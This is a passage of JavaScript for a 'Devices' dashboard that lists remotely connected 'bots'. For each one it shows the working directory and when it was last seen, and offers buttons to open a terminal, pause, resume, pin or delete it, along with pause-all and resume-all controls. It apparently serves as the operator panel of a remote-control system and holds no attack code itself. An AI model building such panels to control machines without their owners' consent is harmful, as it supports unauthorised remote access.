        '<div><strong>CWD:</strong> ' + escapeHtml((b.cwd || '?').substring(0, 35)) + '</div>' +
        '<div style="margin-top:4px;color:var(--text-mute);font-size:10px;">Last seen: ' + lastSeenStr + '</div>' +
      '</div>' +
      '<div class="device-actions" onclick="event.stopPropagation();">' +
        '<button class="device-action-btn" onclick="openTerminal(\\'' + safeId + '\\')">TERM</button>' +
        '<button class="device-action-btn pin ' + (b.pinned ? 'active' : '') + '" onclick="pinBot(\\'' + safeId + '\\')">' + (b.pinned ? '★' : '☆') + '</button>' +
        (isPaused 
          ? '<button class="device-action-btn success" onclick="resumeBot(\\'' + safeId + '\\')">▶ START</button>'
          : '<button class="device-action-btn warning" onclick="pauseBot(\\'' + safeId + '\\')">⏸ STOP</button>'
        ) +
        '<button class="device-action-btn danger" onclick="deleteBot(\\'' + safeId + '\\')">DEL</button>' +
      '</div>' +
    '</div>';
  }).join('');
}

// ═══════════════════════════════════════════════════════════
// 🎮 ACTIONS
// ═══════════════════════════════════════════════════════════
function goToTerminal(botId) {
  window.location.href = '/terminal/' + encodeURIComponent(botId);
}

function openTerminal(botId) {
  window.location.href = '/terminal/' + encodeURIComponent(botId);
}

async function pinBot(botId) {
  try {
    var res = await fetch('/api/pin_bot', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: botId })
    });
    if (res.ok) loadBots();
  } catch (e) { console.error(e); }
}

async function deleteBot(botId) {
  if (!confirm('Delete device "' + botId + '"?')) return;
  try {
    var res = await fetch('/api/delete_bot', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: botId })
    });
    if (res.ok) loadBots();
  } catch (e) { console.error(e); }
}

async function pauseBot(botId) {
  try {
    var res = await fetch('/api/pause_bot', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: botId })
    });
    if (res.ok) loadBots();
  } catch (e) { console.error(e); }
}

async function resumeBot(botId) {
  try {
    var res = await fetch('/api/resume_bot', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: botId })
    });
    if (res.ok) loadBots();
  } catch (e) { console.error(e); }
}

async function pauseAll() {
  if (!confirm('⏸️ Stop ALL bots?')) return;
  try {
    var res = await fetch('/api/pause_all', { method: 'POST' });
    if (res.ok) {
      pausedAll = true;
      loadBots();
    }
  } catch (e) { console.error(e); }
}

async function resumeAll() {
  try {
    var res = await fetch('/api/resume_all', { method: 'POST' });
    if (res.ok) {
      pausedAll = false;
      loadBots();
    }
  } catch (e) { console.error(e); }
}

// ═══════════════════════════════════════════════════════════
// 📥 LOAD BOTS
// ═══════════════════════════════════════════════════════════
async function loadBots() {
  try {
    var res = await fetch('/api/all_bots');
    if (res.status === 401) { window.location.href = '/'; return; }
    allBots = await res.json();
    
    if (allBots.length > 0) {
      pausedAll = allBots[0].pausedAll || false;
    }
    
    renderDevices();
  } catch (e) {
    console.error(e);
  }
}

window.addEventListener('load', function() {
  loadBots();
  setInterval(loadBots, 5000);
});
</script>
`;

  return getLayout("Devices", content, "devices");
}
